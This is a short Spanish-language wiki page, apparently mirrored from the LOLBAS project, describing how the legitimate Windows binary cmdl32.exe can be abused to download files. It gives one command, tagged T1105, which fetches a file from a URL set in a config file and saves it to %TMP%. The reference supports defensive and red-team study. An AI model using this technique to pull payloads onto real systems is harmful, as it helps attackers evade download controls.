# LOLBAS: cmdl32.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Download`

Microsoft Connection Manager Auto-Download

## Comandos

### Download file from Internet

Download · priv: User · T1105

```cmd
cmdl32 /vpn /lan %cd%\config
```

Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under the name VPNXXXX.tmp where "X" denotes a random number or letter.

